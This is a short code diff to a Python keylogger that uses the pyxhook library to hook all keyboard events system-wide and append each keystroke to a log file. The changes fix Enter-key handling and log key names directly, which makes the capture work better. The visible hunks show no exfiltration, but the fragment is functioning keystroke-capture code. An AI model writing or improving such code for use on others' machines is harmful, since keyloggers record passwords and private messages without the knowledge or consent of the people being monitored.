@@ -11,10 +11,10 @@ def main():
     def OnKeyPress(event):
 
         with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
-            if event.Key == 'P_Enter' :
+            if event.Key == 'Return' :
                 f.write('\n')
             else:
-                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters
+                f.write(event.Key)  # Write to the file directly using event.Key
 
     # Create a hook manager object
     new_hook = pyxhook.HookManager()
@@ -27,7 +27,6 @@ def main():
     except KeyboardInterrupt:
         # User cancelled from command line so close the listener
         new_hook.cancel()
-        pass
     except Exception as ex:
         # Write exceptions to the log file, for analysis later.
         msg = f"Error while catching events:\n  {ex}"
